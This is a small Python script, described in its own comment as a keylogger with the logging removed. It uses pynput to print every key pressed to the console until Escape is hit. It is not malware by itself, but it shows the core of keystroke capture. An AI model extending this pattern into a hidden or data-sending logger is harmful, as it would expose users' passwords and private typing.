import pynput

from pynput.keyboard import Key, Listener

# This file is the same keylogger but without the logging function, will only show up in CMD

def on_press(key):
    print("{0} key pressed on keyboard".format(key))


def on_release(key):
    if key == Key.esc:
        return False
# Key that will end the script, default is set to Escape (esc)


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

# Made by Damien/GunFighterMan101
